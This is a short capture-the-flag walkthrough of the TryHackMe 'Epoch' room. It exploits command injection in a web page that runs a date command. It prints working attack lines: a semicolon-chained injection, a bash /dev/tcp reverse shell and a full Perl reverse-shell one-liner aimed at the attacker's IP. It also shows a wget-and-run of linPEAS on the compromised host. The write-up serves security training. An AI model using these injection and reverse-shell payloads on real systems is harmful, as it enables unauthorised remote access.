# Epoch ctf - [Room](https://tryhackme.com/room/epoch)

**This is a super easy ctf, we just need to know Command injection**

Now, lets start the machine and grab the ip
- 10.10.103.183

Lets go the the page "http://10.10.103.183"
we will get this site

![image](https://user-images.githubusercontent.com/80606587/217344037-cbb337bb-2866-4bb5-b6f1-c2bd5e28f2a3.png)

I think thats probably runs `date` on a linux machine, sooo... lets try something here

![image](https://user-images.githubusercontent.com/80606587/217343976-39720892-cae9-42e0-bd6a-b355ae66cad8.png)

Ok, good, output was expected..
so now that we know, that we can execute commands lets try a reverse shell
(first we will check if it has python, php, perl etc etc.)
Doing that `156561654; which sh; which python; which python3; which perl; which php; which nc; which netcat; which bash`( i just did which bash and which sh, because if all of that doesnt have on the system we get `exit status 1`)

we can see

![image](https://user-images.githubusercontent.com/80606587/217344830-9b475fc2-0095-4c68-a1d2-f117a7209a9e.png)

Perl is on the system.

I know that we can get a bash in our `nc -lvnp` via ` bash -i >& /dev/tcp/$thmvpnip/9001 0>&1`
but i will use a perl reverse shell for demonstration
Lets execute that on site
`15646464;perl -e 'use Socket;$i="yourthmvpnip";$p=portyouputonlistener;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

![image](https://user-images.githubusercontent.com/80606587/217349766-b8d50109-1536-4aaf-bae9-6a7d7d2f84c4.png)

Now that we got the shell lets use `export TERM=xterm`


now to reach the flag we have two ways to get to the flag.
## 1º. WAY `env`
As the hint, we run `env` to see the environment

![image](https://user-images.githubusercontent.com/80606587/217352773-35519b4a-c93e-442f-a468-e126e0a50522.png)


## 2º. Way `Linpeas.sh`
As normal, after we get into a machine, we normally use some automatic script to analise or search vulns in a machine we got acces
or sometimes we do that manually, but.. as this is ctf machines, nothing like using linPEAS.sh or other script, sooo, lets upload the linPEAS.sh to the machine

Pwned machine:
`cd /tmp && wget http://yourthmvpnip:portyouset/linPEAS.sh && chmod +x linPEAS.sh`
`./linPEAS.sh`

 And let it run..
What we need is here.
![image](https://user-images.githubusercontent.com/80606587/217355037-fda9713e-c99b-41c0-b991-d1bad73c1bb7.png)

(In that case the room is over , we got the flag, gg, but if u need to privesc(as happens in other machines) you can see more of linpeas gives)
